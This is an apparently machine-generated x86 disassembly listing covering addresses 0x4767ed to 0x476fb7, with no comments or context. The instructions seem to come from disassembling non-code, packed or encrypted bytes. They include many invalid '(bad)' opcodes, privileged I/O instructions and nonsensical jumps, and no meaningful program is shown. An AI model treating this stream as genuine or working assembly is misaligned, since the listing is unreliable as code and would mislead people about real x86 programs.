  4767ed:	mov    cl,0x34
  4767ef:	loope  0x4767cb
  4767f1:	shl    BYTE PTR [ebx],1
  4767f3:	loope  0x4767b7
  4767f5:	mov    gs,WORD PTR [ecx+esi*4]
  4767f8:	icebp  
  4767f9:	fdivr  st(7),st
  4767fb:	fsubp  st(5),st
  4767fd:	fiadd  DWORD PTR [eax]
  4767ff:	xor    al,0xf5
  476801:	add    DWORD PTR [eax],0xffffff93
  476804:	adc    DWORD PTR [esi+edx*1],ecx
  476807:	(bad)  
  476808:	pop    ebp
  476809:	sbb    ch,BYTE PTR [eax]
  47680b:	loopne 0x4767ef
  47680d:	daa    
  47680e:	dec    ecx
  47680f:	pop    edx
  476810:	pop    edi
  476811:	enter  0xbef6,0x87
  476815:	retf   0x1760
  476818:	ror    BYTE PTR [edx],0x1d
  47681b:	fimul  DWORD PTR [esi]
  47681d:	and    bh,cl
  47681f:	xor    esp,DWORD PTR [edx+0x2b8c061f]
  476825:	sahf   
  476826:	add    esp,esp
  476828:	imul   ebx,eax,0x9e987665
  47682e:	add    BYTE PTR [bx+di-0x52],bh
  476832:	dec    eax
  476833:	pop    eax
  476834:	ret    
  476835:	nop
  476836:	out    0x19,eax
  476838:	inc    eax
  476839:	sub    bl,BYTE PTR [eax]
  47683b:	inc    ebx
  47683c:	add    esp,esp
  47683e:	jns    0x476846
  476840:	or     bl,ch
  476842:	test   BYTE PTR [edi+0x0],ah
  476845:	jns    0x4767e5
  476847:	jecxz  0x4767e6
  476849:	cdq    
  47684a:	(bad)
  47684d:	inc    eax
  47684e:	sahf   
  47684f:	pop    ebp
  476850:	imul   esp,DWORD PTR [edi+0x679e41d],0xe681da90
  47685a:	jp     0x47686c
  47685c:	ds int 0x1
  47685f:	imul   edi,DWORD PTR [ebx],0xffffffa6
  476862:	jns    0x47683f
  476864:	popa   
  476865:	and    edi,ecx
  476867:	out    dx,eax
  476868:	cmp    esi,esi
  47686a:	pop    ss
  47686b:	fnstenv ds:0xcd9dbba
  476871:	and    bh,cl
  476873:	aaa    
  476874:	enter  0x991d,0x3f
  476878:	stos   BYTE PTR es:[edi],al
  476879:	cmp    al,0x3
  47687b:	enter  0x59f3,0x18
  47687f:	test   BYTE PTR [ecx],bl
  476881:	cmp    al,0xcf
  476883:	add    dl,dh
  476885:	pop    ebp
  476886:	outs   dx,BYTE PTR ds:[esi]
  476887:	fcmovbe st,st(6)
  476889:	and    bh,cl
  47688b:	xor    eax,DWORD PTR [eax+0x3bb9a40]
  476891:	enter  0xcf3,0x22
  476895:	pop    edx
  476896:	jl     0x47689a
  476898:	int    0x2b
  47689a:	stc    
  47689b:	cmp    al,0x1a
  47689d:	xor    DWORD PTR [ebx+ebp*8],ecx
  4768a0:	dec    ebx
  4768a1:	ffreep st(3)
  4768a3:	xor    eax,DWORD PTR [eax-0x6032ddc4]
  4768a9:	and    eax,0xc84df7c8
  4768ae:	add    cl,BYTE PTR [edi+0x17]
  4768b1:	data16 jno 0x476915
  4768b4:	enter  0x4df3,0xc8
  4768b8:	sub    WORD PTR ds:0xf213821e,bx
  4768bf:	jl     0x4768c4
  4768c1:	add    eax,0x8e37db53
  4768c6:	adc    esi,DWORD PTR [edx]
  4768c8:	bnd jl 0x476900
  4768cb:	fwait
  4768cc:	jo     0x476869
  4768ce:	pusha  
  4768cf:	fild   WORD PTR [eax]
  4768d1:	bnd jl 0x4768f1
  4768d4:	pop    ebx
  4768d5:	xchg   ebp,eax
  4768d6:	inc    edx
  4768d7:	push   ebx
  4768d8:	sbb    edi,DWORD PTR [edi+ebx*8]
  4768db:	test   BYTE PTR [esp+edx*1],bh
  4768de:	shl    DWORD PTR ds:0xee9e43dc,0x84
  4768e5:	mov    esp,ds
  4768e7:	stos   DWORD PTR es:[edi],eax
  4768e8:	sbb    ebx,DWORD PTR ds:0xefc8849c
  4768ee:	sbb    DWORD PTR [eax-0x73],eax
  4768f1:	pop    esp
  4768f2:	push   ebx
  4768f3:	sub    cl,BYTE PTR [edx+esi*1]
  4768f6:	repnz lock sbb eax,0x311c1709
  4768fd:	pop    ds
  4768fe:	sbb    al,0x0
  476900:	imul   edi,DWORD PTR [esi+0x13],0xbc121dea
  476907:	mov    BYTE PTR [ecx],bl
  476909:	inc    eax
  47690a:	sahf   
  47690b:	les    edx,FWORD PTR [bx+di-0x5133]
  476910:	jns    0x476918
  476912:	nop
  476913:	out    0x51,eax
  476915:	test   BYTE PTR [eax+0x19e7913],0xe4
  47691c:	or     al,0x62
  47691e:	shr    BYTE PTR [ebx],cl
  476920:	xchg   edx,eax
  476921:	dec    edi
  476922:	jae    0x476924
  476924:	dec    esp
  476925:	imul   edx,DWORD PTR [edx-0x6ff904ee],0xffffffe7
  47692c:	mov    ecx,0xe21522e
  476931:	sahf   
  476932:	add    esp,esp
  476934:	jns    0x476946
  476936:	xchg   edx,eax
  476937:	out    dx,eax
  476938:	xlat   BYTE PTR ds:[ebx]
  476939:	sahf   
  47693a:	add    BYTE PTR [bx+di+0x47],bh
  47693e:	leave  
  47693f:	xchg   edi,eax
  476940:	inc    eax
  476941:	nop
  476942:	out    0x19,eax
  476944:	inc    eax
  476945:	mov    ds:0xe4013557,eax
  47694a:	jns    0x476952
  47694c:	test   DWORD PTR [ecx],edx
  47694e:	adc    al,0x67
  476950:	add    BYTE PTR [ecx-0x62],bh
  476953:	shl    BYTE PTR [bp+di],1
  476956:	inc    ecx
  476957:	rcr    DWORD PTR [eax+eax*2],cl
  47695a:	sahf   
  47695b:	nop
  47695c:	stc    
  47695d:	sub    edi,DWORD PTR [ebx+0x50]
  476960:	repnz cmp al,0x3
  476963:	enter  0x17fa,0x16
  476967:	sub    al,BYTE PTR [eax-0x17ff30c4]
  47696d:	aad    0x3f
  47696f:	or     al,0x20
  476971:	iret   
  476972:	xor    ecx,edx
  476974:	xchg   ebp,eax
  476975:	js     0x47691b
  476977:	cmp    al,0x3
  476979:	enter  0x55f3,0x6d
  47697d:	mov    ss,ecx
  47697f:	cmp    al,0xcf
  476981:	add    dl,dh
  476983:	pushaw 
  476985:	fisubr WORD PTR [ebx-0x7fcc30e0]
  47698b:	inc    edx
  47698c:	sahf   
  47698d:	pushf  
  47698e:	push   edi
  47698f:	repnz imul ecx,DWORD PTR [esi],0xa15e8b2c
  476996:	jmp    0x4769a4
  476998:	iret   
  476999:	add    dl,dh
  47699b:	cmp    al,0x56
  47699d:	xor    ch,ch
  47699f:	adc    al,0xcf
  4769a1:	xor    eax,DWORD PTR [eax-0x2c30a8c4]
  4769a7:	jo     0x476971
  4769a9:	repz or al,0x20
  4769ac:	test   eax,0xf200e593
  4769b1:	cmp    al,0x3
  4769b3:	adc    DWORD PTR [ebx+0x35],0x3b
  4769b7:	nop
  4769b8:	ds iret 
  4769ba:	gs adc eax,0xe07debc3
  4769c0:	xor    eax,0xe791c81d
  4769c5:	aam    0x5
  4769c7:	aam    0xbc
  4769c9:	ret    0x39a
  4769cc:	enter  0x1df3,0x94
  4769d0:	fldcw  WORD PTR [ebx+ebx*2+0x679e54]
  4769d7:	jns    0x4769d3
  4769d9:	xchg   esi,eax
  4769da:	fxch   st(7)
  4769dc:	nop
  4769dd:	out    0x19,eax
  4769df:	inc    eax
  4769e0:	push   0xe4260999
  4769e5:	jnp    0x4769ed
  4769e7:	dec    edx
  4769e8:	pop    ecx
  4769e9:	lods   eax,DWORD PTR ds:[esi]
  4769ea:	in     eax,dx
  4769eb:	leave  
  4769ec:	es fs in al,0xf9
  4769f0:	xor    eax,0xa3192d19
  4769f5:	jns    0x476a1d
  4769f7:	in     al,0x79
  4769f9:	(bad)  
  4769fb:	and    eax,0x6426f99a
  476a00:	in     al,0x1b
  476a02:	call   0x19e:0x7c5a1d01
  476a09:	in     al,0x6c
  476a0b:	loop   0x476a27
  476a0d:	xchg   ecx,eax
  476a0e:	fwait
  476a0f:	inc    eax
  476a10:	sahf   
  476a11:	out    0x95,al
  476a13:	int3   
  476a14:	stos   DWORD PTR es:[edi],eax
  476a15:	fild   WORD PTR [edx+0x19efc81d]
  476a1b:	mov    dh,0x9f
  476a1d:	(bad)  
  476a1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  476a1f:	fwait
  476a20:	sub    BYTE PTR [ebp-0x38],cl
  476a23:	enter  0x35f3,0x5f
  476a27:	add    DWORD PTR [edi+0x8],ebx
  476a2a:	jl     0x476a2f
  476a2c:	enter  0x1df3,0x1f
  476a30:	fsubp  st(1),st
  476a32:	push   ebx
  476a33:	fdiv   st,st(2)
  476a35:	jl     0x476a4a
  476a37:	repnz repz arpl WORD PTR ds:0x3cf24398,si
  476a3f:	adc    esi,DWORD PTR [edx]
  476a41:	cwde   
  476a42:	inc    ebp
  476a43:	pop    eax
  476a44:	fnstenv [edx]
  476a46:	repnz cmp al,0x13
  476a49:	rcr    BYTE PTR [eax],0x49
  476a4c:	sbb    BYTE PTR [eax],al
  476a4e:	bnd jl 0x476a64
  476a51:	mov    ds:0x199fdd1d,al
  476a56:	inc    eax
  476a57:	sahf   
  476a58:	out    0x8c,al
  476a5a:	mov    ebx,0xb76989d
  476a5f:	hlt    
  476a60:	dec    ecx
  476a61:	hlt    
  476a62:	pop    ebp
  476a63:	mov    esp,0x91ce69a0
  476a68:	fwait
  476a69:	loopne 0x476a61
  476a6b:	(bad)  
  476a6c:	(bad)  
  476a6d:	(bad)  
  476a6e:	(bad)  
  476a70:	(bad)  
  476a71:	aam    0x82
  476a73:	lods   al,BYTE PTR ds:[esi]
  476a74:	out    0xf0,al
  476a76:	icebp  
  476a77:	cmc    
  476a78:	call   0xe4a2820e
  476a7d:	rol    eax,0x10
  476a80:	jmp    0x6d83b5dd
  476a85:	(bad)  
  476a86:	in     al,dx
  476a87:	test   esp,eax
  476a89:	imul   edx,DWORD PTR [esi],0x28
  476a8c:	inc    edi
  476a8d:	cld    
  476a8e:	mov    al,ds:0x3b40d9ce
  476a93:	inc    esi
  476a94:	push   es
  476a95:	jmp    0x2a63008
  476a9a:	adc    cl,BYTE PTR ds:0xa04de117
  476aa0:	xchg   ecx,eax
  476aa1:	xchg   ecx,eax
  476aa2:	inc    ecx
  476aa3:	xchg   ecx,eax
  476aa4:	sub    eax,0xde29bdc2
  476aa9:	ficomp WORD PTR ds:0x55de18d
  476aaf:	addr16 push cs
  476ab1:	inc    eax
  476ab2:	pop    esp
  476ab3:	and    DWORD PTR [ecx],ebp
  476ab5:	call   DWORD PTR [edx]
  476ab7:	lea    ecx,[ebp+ecx*1+0x381d2bf2]
  476abe:	or     eax,0xc70a13a6
  476ac3:	lods   eax,DWORD PTR ds:[esi]
  476ac4:	push   0x9c5b81fb
  476ac9:	(bad)  
  476aca:	jns    0x476ad2
  476acc:	fstp   DWORD PTR [esi+0x6e]
  476acf:	icebp  
  476ad0:	imul   esp,DWORD PTR [eax+ebx*1-0x2a],0x53
  476ad5:	jbe    0x476a84
  476ad7:	sbb    BYTE PTR [ecx+0xe],bl
  476ada:	repz pop es
  476adc:	add    esp,DWORD PTR [ecx-0x7505fb93]
  476ae2:	cmc    
  476ae3:	loopne 0x476ac3
  476ae5:	rcl    DWORD PTR [ebp+0x640e5919],0x92
  476aec:	mul    BYTE PTR [ebp+0x37]
  476aef:	cmp    eax,0x1ed6c81e
  476af4:	rcl    BYTE PTR [ebx+0x111c1703],cl
  476afa:	add    ebp,ecx
  476afc:	fadd   DWORD PTR [eax-0x21]
  476aff:	and    esp,DWORD PTR [edx-0x62311770]
  476b05:	in     eax,dx
  476b06:	(bad)  
  476b07:	out    dx,al
  476b08:	jle    0x476b69
  476b0a:	or     eax,0x1108d3ed
  476b0f:	pushf  
  476b10:	xchg   esp,eax
  476b11:	icebp  
  476b12:	push   ss
  476b13:	mov    ecx,DWORD PTR [edi-0x12ee8435]
  476b19:	sar    DWORD PTR [ecx-0x6ce953f1],cl
  476b1f:	adc    eax,0x5b9a1406
  476b24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  476b25:	add    al,0x3b
  476b27:	add    edi,ebp
  476b29:	out    0x2c,al
  476b2b:	pop    ebx
  476b2c:	or     al,0xed
  476b2e:	xchg   ebx,eax
  476b2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  476b30:	push   esp
  476b31:	fcomp  DWORD PTR ds:0xa706a05f
  476b37:	mov    ah,0x82
  476b39:	mov    esp,0xf53fbd93
  476b3e:	ja     0x476b37
  476b40:	sub    al,0x6f
  476b42:	add    al,0xa8
  476b44:	mov    ebx,0x56f16a16
  476b49:	pop    ebx
  476b4a:	es retf 
  476b4c:	int    0x20
  476b4e:	(bad)  
  476b50:	mov    dh,0xa8
  476b52:	or     BYTE PTR [eax+eax*2],bl
  476b55:	mov    esi,0xc45e25f5
  476b5a:	xor    esi,ebp
  476b5c:	int    0x24
  476b5e:	push   edi
  476b5f:	xor    bh,BYTE PTR [edi+0x67]
  476b62:	jg     0x476b73
  476b64:	push   ebx
  476b65:	sub    al,0x9c
  476b67:	out    0xc5,al
  476b69:	inc    ebp
  476b6a:	into   
  476b6b:	xor    esp,eax
  476b6d:	inc    edx
  476b6e:	jo     0x476be6
  476b70:	out    dx,eax
  476b71:	mov    bh,0x6a
  476b73:	imul   esp,DWORD PTR [ecx-0x3e],0xd85bee0f
  476b7a:	pop    ebx
  476b7b:	sub    BYTE PTR [ecx*1+0x59f41b9b],bl
  476b82:	push   ebp
  476b83:	jecxz  0x476b66
  476b85:	in     ax,0xcc
  476b88:	sti    
  476b89:	(bad)  
  476b8a:	and    dl,cl
  476b8c:	sub    BYTE PTR [esi+0x73],0xdf
  476b90:	cmp    dl,BYTE PTR [ebp+0x10]
  476b93:	add    BYTE PTR [ebx+0x21a27f8],bl
  476b99:	pusha  
  476b9a:	mov    cl,0x9a
  476b9c:	sub    DWORD PTR [ebp-0x223ef7e6],eax
  476ba2:	jns    0x476bf1
  476ba4:	pusha  
  476ba5:	mov    ebp,0xbd86d361
  476baa:	inc    edi
  476bab:	pop    ebx
  476bac:	mov    eax,ds:0x3cf25b5d
  476bb1:	xchg   ebx,eax
  476bb2:	pop    eax
  476bb3:	mov    edx,DWORD PTR [esi]
  476bb5:	in     al,dx
  476bb6:	push   ecx
  476bb7:	daa    
  476bb8:	call   0x7922:0xfdd1525
  476bbf:	popa   
  476bc0:	daa    
  476bc1:	sar    BYTE PTR [ebx+0x1d53db1f],1
  476bc7:	pop    ecx
  476bc8:	ret    0x5ede
  476bcb:	dec    edi
  476bcc:	pop    edi
  476bcd:	jns    0x476c0d
  476bcf:	sub    cl,BYTE PTR [eax+0x53]
  476bd2:	inc    edx
  476bd3:	jp     0x476b77
  476bd5:	icebp  
  476bd6:	jbe    0x476b9c
  476bd8:	mov    al,0x41
  476bda:	(bad)  [ecx]
  476bdc:	dec    ecx
  476bdd:	pop    esp
  476bde:	sub    al,0xc7
  476be0:	pop    edi
  476be1:	inc    edi
  476be2:	or     DWORD PTR [ebx+0x17],0xc1add2ef
  476be9:	fst    QWORD PTR [ebx]
  476beb:	in     al,0xf6
  476bed:	mov    dh,0x3f
  476bef:	add    BYTE PTR [ebx-0x30],bl
  476bf2:	jno    0x476bf8
  476bf4:	add    cl,BYTE PTR [esi]
  476bf6:	or     ch,BYTE PTR [edi-0x6c6d8ded]
  476bfc:	pushf  
  476bfd:	cli    
  476bfe:	loop   0x476c3d
  476c00:	mov    dl,0xb6
  476c02:	xor    BYTE PTR [esi-0x37],0xc9
  476c06:	dec    esi
  476c07:	xchg   esi,eax
  476c08:	inc    edx
  476c09:	xor    BYTE PTR ss:[edi-0x36c6f589],dh
  476c10:	dec    ecx
  476c11:	dec    esi
  476c12:	shl    DWORD PTR [edi],1
  476c14:	sahf   
  476c15:	mov    al,ds:0xe49c806f
  476c1a:	and    al,0x27
  476c1c:	and    al,0x16
  476c1e:	push   edx
  476c1f:	cmc    
  476c20:	test   eax,0x92724ea5
  476c25:	xchg   ebx,eax
  476c26:	adc    DWORD PTR [ebp-0x512b11f0],eax
  476c2c:	daa    
  476c2d:	cmp    ecx,ecx
  476c2f:	dec    ecx
  476c30:	xor    eax,0xede06124
  476c35:	xor    eax,0x24e49c93
  476c3a:	aad    0x56
  476c3c:	cmc    
  476c3d:	ss mov ch,0x49
  476c40:	dec    esi
  476c41:	jb     0x476bd5
  476c43:	jecxz  0x476bcb
  476c45:	xchg   ebx,eax
  476c46:	mul    esp
  476c48:	xor    BYTE PTR [edx],bl
  476c4a:	xor    eax,0xa3a48ec9
  476c4f:	loope  0x476c56
  476c51:	xchg   esi,eax
  476c52:	loop   0x476c89
  476c54:	aam    0xe0
  476c56:	or     BYTE PTR ds:0x2616aeca,dl
  476c5c:	add    al,0x13
  476c5e:	je     0x476c17
  476c60:	xchg   edi,eax
  476c61:	int    0x18
  476c63:	inc    ecx
  476c64:	inc    edx
  476c65:	inc    esi
  476c66:	jp     0x476be8
  476c68:	cmp    ebp,esp
  476c6a:	sbb    eax,0xc917a72
  476c6f:	sbb    eax,0x9e14f66
  476c74:	sbb    BYTE PTR [eax-0x6c97f6f1],bl
  476c7a:	nop
  476c7b:	and    BYTE PTR [edi-0x20],0xd
  476c7f:	adc    edx,DWORD PTR [ebx+esi*1]
  476c82:	int3   
  476c83:	mov    al,ds:0xf5799c80
  476c88:	mov    dh,0x47
  476c8a:	or     ebx,DWORD PTR [ecx+eax*1-0x5af35e25]
  476c91:	out    0x70,al
  476c93:	or     al,0x19
  476c95:	inc    eax
  476c96:	add    al,0xf1
  476c98:	mov    ch,0x99
  476c9a:	add    DWORD PTR [esi+0x37],esp
  476c9d:	or     DWORD PTR [esi-0x4fc4a2f3],eax
  476ca3:	or     DWORD PTR [ecx+0x61],edi
  476ca6:	sbb    al,BYTE PTR [edi-0x333c780b]
  476cac:	dec    cx
  476cae:	xchg   DWORD PTR cs:[ebx],esp
  476cb1:	cdq    
  476cb2:	sub    al,0x3a
  476cb4:	in     al,dx
  476cb5:	add    eax,0xd7e6a41a
  476cba:	fwait
  476cbb:	inc    edx
  476cbc:	(bad)  
  476cbd:	sbb    BYTE PTR [ebx-0x21ec1e7a],bl
  476cc3:	shr    BYTE PTR [edx+ebp*2+0x16398995],0x2b
  476ccb:	stos   DWORD PTR es:[edi],eax
  476ccc:	push   cs
  476ccd:	xor    al,0xac
  476ccf:	jns    0x476d43
  476cd1:	sub    DWORD PTR [esi+ebp*2+0x3f],0x8d6f9c1c
  476cd9:	sub    eax,0xb2dc3493
  476cde:	sbb    al,0x9c
  476ce0:	push   edx
  476ce1:	fwait
  476ce2:	cwde   
  476ce3:	sbb    DWORD PTR [ebx],ebx
  476ce5:	push   esi
  476ce6:	iret   
  476ce7:	push   cs
  476ce8:	sbb    al,0x8
  476cea:	mov    dh,0xad
  476cec:	push   eax
  476ced:	int    0x9c
  476cef:	dec    ecx
  476cf0:	pop    ecx
  476cf1:	add    ebx,DWORD PTR [ebx+0x3dedf1d2]
  476cf7:	dec    ebx
  476cf8:	aad    0x85
  476cfa:	(bad)  
  476cfb:	pop    ds
  476cfc:	fcom   QWORD PTR [ecx]
  476cfe:	add    esp,DWORD PTR [eax-0x4d]
  476d01:	outs   dx,DWORD PTR ds:[esi]
  476d02:	rcr    BYTE PTR [ebx],cl
  476d04:	(bad)  
  476d06:	dec    ecx
  476d07:	fmul   QWORD PTR [edi+0x26]
  476d0a:	xor    eax,0xd8cd6036
  476d0f:	sub    DWORD PTR [edx+0x1b],ebp
  476d12:	and    BYTE PTR [esi+eiz*1-0x60],bl
  476d16:	add    eax,0xa4151a9b
  476d1b:	xchg   edi,eax
  476d1c:	ins    BYTE PTR es:[edi],dx
  476d1d:	inc    ebx
  476d1e:	mov    dh,0x64
  476d20:	adc    eax,0xd210164a
  476d25:	push   cs
  476d26:	mov    ecx,cs
  476d28:	test   BYTE PTR [eax+ebx*2+0x6d4e128d],bl
  476d2f:	adc    BYTE PTR [edx],bh
  476d31:	lods   eax,DWORD PTR ds:[esi]
  476d32:	mov    BYTE PTR [esi+0x48364841],dl
  476d38:	xchg   DWORD PTR [ebx+0x4473c8e1],eax
  476d3e:	(bad)  
  476d40:	loopne 0x476d91
  476d42:	inc    esi
  476d43:	pop    esp
  476d44:	loopne 0x476d4d
  476d46:	mov    BYTE PTR [ebx],dl
  476d48:	jbe    0x476d57
  476d4a:	popa   
  476d4b:	pop    es
  476d4c:	aam    0x41
  476d4e:	pop    eax
  476d4f:	or     ah,BYTE PTR [edi-0x70]
  476d52:	dec    ecx
  476d53:	push   0x9b16fdb7
  476d58:	add    bl,BYTE PTR [ecx]
  476d5a:	inc    ebx
  476d5b:	pop    esp
  476d5c:	add    ecx,DWORD PTR [eax-0xe]
  476d5f:	cmp    al,0xe2
  476d61:	loope  0x476d7f
  476d63:	pop    ds
  476d64:	mov    bh,0x3d
  476d66:	xor    ebx,eax
  476d68:	push   edx
  476d69:	fwait
  476d6a:	jle    0x476d62
  476d6c:	xchg   edx,eax
  476d6d:	pop    DWORD PTR [edi]
  476d6f:	mov    esp,0x6749d47a
  476d74:	sar    bh,1
  476d76:	jnp    0x476dbb
  476d78:	test   dh,al
  476d7a:	ds dec ebx
  476d7c:	xor    DWORD PTR [edi],ebx
  476d7e:	add    dl,BYTE PTR [ebx+0x1959b313]
  476d84:	into   
  476d85:	pusha  
  476d86:	fucomp st(0)
  476d88:	xchg   ebp,eax
  476d89:	push   ds
  476d8a:	mov    edi,0xe964196a
  476d8f:	mov    cs,eax
  476d91:	xchg   ecx,eax
  476d92:	jae    0x476db0
  476d94:	sbb    edx,ebp
  476d96:	mov    DWORD PTR [edi+0x18],esp
  476d99:	xor    bl,BYTE PTR [ecx+0x31e75b8e]
  476d9f:	retf   0x600c
  476da2:	xchg   BYTE PTR [esi],bl
  476da4:	xor    bh,BYTE PTR [esi-0x493ef794]
  476daa:	mov    ebp,0x5ef1a5ef
  476daf:	xor    DWORD PTR [ebx],esi
  476db1:	enter  0x2959,0x16
  476db5:	push   edi
  476db6:	adc    BYTE PTR [edx],cl
  476db8:	pop    esi
  476db9:	int    0x9a
  476dbb:	push   eax
  476dbc:	jae    0x476d53
  476dbe:	out    dx,eax
  476dbf:	jae    0x476d99
  476dc1:	nop
  476dc2:	inc    ecx
  476dc3:	xchg   DWORD PTR [edi+0xb],ebx
  476dc6:	pushf  
  476dc7:	mov    esp,0xad737849
  476dcc:	rcr    DWORD PTR [edi],0xce
  476dcf:	mov    ch,0xfe
  476dd1:	add    ch,cl
  476dd3:	xchg   ebx,eax
  476dd4:	adc    DWORD PTR [esi+0x38],esi
  476dd7:	sbb    ebx,DWORD PTR [eax]
  476dd9:	add    ah,BYTE PTR [ebx]
  476ddb:	repnz sahf 
  476ddd:	and    ecx,DWORD PTR [esi*8+0x5b411484]
  476de4:	pop    es
  476de5:	or     al,0xf5
  476de7:	test   al,0x15
  476de9:	neg    BYTE PTR [ebx]
  476deb:	sub    DWORD PTR [ecx],ecx
  476ded:	mov    dh,0x44
  476def:	jb     0x476dc7
  476df1:	dec    edx
  476df2:	rcl    DWORD PTR [esi+0x12],cl
  476df5:	cli    
  476df6:	pop    ebx
  476df7:	push   ds
  476df8:	xchg   ebx,eax
  476df9:	adc    dl,cl
  476dfb:	dec    esi
  476dfc:	rcr    DWORD PTR [ebx+0x5f],0x92
  476e00:	xor    esi,DWORD PTR [edi-0x40]
  476e03:	sbb    BYTE PTR [ebx+0x2ba594b],cl
  476e09:	sbb    DWORD PTR [ebp-0x16],edx
  476e0c:	test   DWORD PTR [edx],edi
  476e0e:	sbb    al,0x6c
  476e10:	test   cl,cl
  476e12:	add    DWORD PTR [ebx+edi*8+0x5e501e8d],0xc7dea334
  476e1d:	mov    ds:0x985887ab,eax
  476e22:	shl    DWORD PTR [edi+ebx*4],0x9c
  476e26:	aam    0x20
  476e28:	pop    es
  476e29:	adc    BYTE PTR [edx+0x55],ah
  476e2c:	lods   al,BYTE PTR ds:[esi]
  476e2d:	and    al,0x1e
  476e2f:	mov    al,0x37
  476e31:	or     BYTE PTR [ebx-0x11],bl
  476e34:	pop    ebx
  476e35:	sbb    ah,BYTE PTR [ebp-0x33d39a5c]
  476e3b:	test   al,0xbd
  476e3d:	and    al,0x2d
  476e3f:	sub    ebp,esi
  476e41:	sbb    BYTE PTR [edx+0xfbbdb2f],bl
  476e47:	and    DWORD PTR [edx+0x4c51c149],ebx
  476e4d:	adc    BYTE PTR [ecx],dl
  476e4f:	sub    al,0x15
  476e51:	rol    DWORD PTR [edx],1
  476e53:	xchg   ecx,eax
  476e54:	mov    WORD PTR [esi+eax*4+0x6f],gs
  476e58:	sahf   
  476e59:	adc    ebp,DWORD PTR [ecx]
  476e5b:	fstp   DWORD PTR [eax+0x589d051e]
  476e61:	or     bl,ah
  476e63:	popf   
  476e64:	rcl    BYTE PTR [esi+ecx*1],1
  476e67:	xchg   ecx,eax
  476e68:	daa    
  476e69:	imul   edx,DWORD PTR gs:[esp+eiz*2],0x61
  476e6e:	add    al,0xeb
  476e70:	pop    eax
  476e71:	xor    edx,DWORD PTR [edi+0x10]
  476e74:	fadd   st(0),st
  476e76:	push   ss
  476e77:	jns    0x476e0a
  476e79:	jmp    0x476e19
  476e7b:	xor    ebp,esp
  476e7d:	loopne 0x476ea5
  476e7f:	add    al,0x83
  476e81:	enter  0x8f73,0xc
  476e85:	and    eax,edi
  476e87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  476e88:	es (bad) 
  476e8a:	ins    DWORD PTR es:[edi],dx
  476e8b:	pop    ss
  476e8c:	(bad)  [ebx-0x432cfd77]
  476e92:	fcomp  st(6)
  476e94:	pop    ebx
  476e95:	add    eax,0x2b58f106
  476e9a:	pop    es
  476e9b:	ror    DWORD PTR [edi+0x48d8e05],1
  476ea1:	pop    ebx
  476ea2:	scas   al,BYTE PTR es:[edi]
  476ea3:	inc    ebx
  476ea4:	jae    0x476ebc
  476ea6:	dec    edx
  476ea7:	sub    al,0x56
  476ea9:	test   eax,0x62939893
  476eae:	push   0xec182151
  476eb3:	test   DWORD PTR [ecx],ecx
  476eb5:	sbb    dl,BYTE PTR [ecx-0x1]
  476eb8:	jne    0x476e99
  476eba:	cmp    esp,DWORD PTR [esp+ebx*1+0x58faf152]
  476ec1:	es es mov ecx,0x5993a9dc
  476ec8:	fcomp  QWORD PTR [eax-0x7c]
  476ecb:	push   eax
  476ecc:	push   edi
  476ecd:	pop    es
  476ece:	mov    ecx,0xab9c382b
  476ed3:	sahf   
  476ed4:	xor    ah,ch
  476ed6:	fidiv  WORD PTR [ecx+0x69]
  476ed9:	mov    esi,0x130a6b66
  476ede:	pushf  
  476edf:	adc    BYTE PTR [eax],cl
  476ee1:	pop    esp
  476ee2:	and    bh,BYTE PTR [ebx+edx*1+0x722158bc]
  476ee9:	push   ebp
  476eea:	adc    DWORD PTR [ebx-0x12d371c3],eax
  476ef0:	push   ebx
  476ef1:	aam    0xb7
  476ef3:	inc    ebp
  476ef4:	adc    dl,BYTE PTR ds:0x26d9ec6
  476efa:	ja     0x476f09
  476efc:	add    al,dl
  476efe:	sbb    ah,0x2c
  476f01:	adc    al,0x22
  476f03:	dec    esp
  476f04:	pop    ss
  476f05:	popa   
  476f06:	adc    al,BYTE PTR fs:[esi-0x70]
  476f0a:	int    0x74
  476f0c:	jb     0x476ee1
  476f0e:	jmp    0xf056:0xbc78cd1
  476f15:	xchg   ebx,eax
  476f16:	xchg   edx,eax
  476f17:	dec    esp
  476f18:	(bad)  
  476f19:	(bad)  
  476f1a:	sbb    ch,bh
  476f1c:	js     0x476f14
  476f1e:	cmp    eax,0x64146f10
  476f23:	mov    eax,ds:0x116be558
  476f28:	int3   
  476f29:	mov    esi,0xb6e4ca57
  476f2e:	sub    edx,edi
  476f30:	push   esi
  476f31:	sbb    ebp,esp
  476f33:	lods   al,BYTE PTR ds:[esi]
  476f34:	mov    WORD PTR [eax-0x4f],es
  476f37:	xchg   ebx,eax
  476f38:	and    al,0x61
  476f3a:	packssdw mm4,QWORD PTR [edi]
  476f3d:	rcl    DWORD PTR [eax+0xfee4f8d],0xd
  476f44:	hlt    
  476f45:	out    dx,al
  476f46:	pop    ebx
  476f47:	std    
  476f48:	cwde   
  476f49:	sub    DWORD PTR [ecx+0x5e],0xe02821d1
  476f50:	mov    ebp,ecx
  476f52:	mov    eax,DWORD PTR [edx]
  476f54:	adc    eax,0xef8f6382
  476f59:	out    dx,eax
  476f5a:	sahf   
  476f5b:	and    eax,0xa8f73db
  476f60:	add    ch,dh
  476f62:	les    edi,FWORD PTR [ebx+0x4b0d9254]
  476f68:	icebp  
  476f69:	fist   WORD PTR [esp+edx*4]
  476f6c:	mov    dh,BYTE PTR [edi+0x2c70ac4b]
  476f72:	ds jmp 0xeec68bbc
  476f78:	push   ds
  476f79:	imul   BYTE PTR [edx+edx*1]
  476f7c:	daa    
  476f7d:	addr16 in al,0x6b
  476f80:	mov    dl,0x17
  476f82:	mov    eax,ds:0xf7b513c4
  476f87:	nop
  476f88:	inc    ecx
  476f89:	inc    edi
  476f8a:	mov    ebp,0x771e10c1
  476f8f:	daa    
  476f90:	into   
  476f91:	rcr    DWORD PTR [eax],cl
  476f93:	and    eax,0x812e6e27
  476f98:	and    ecx,ecx
  476f9a:	stos   BYTE PTR es:[edi],al
  476f9b:	mov    ebx,ebx
  476f9d:	mov    ebx,0x68eead0a
  476fa2:	sahf   
  476fa3:	and    BYTE PTR ds:0x51bbe169,dl
  476fa9:	fsub   DWORD PTR [ebp+0x7b76076]
  476faf:	aam    0xf1
  476fb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  476fb2:	imul   edi,DWORD PTR [ebx],0x5d
  476fb5:	xor    DWORD PTR [edi],edx
  476fb7:	icebp  
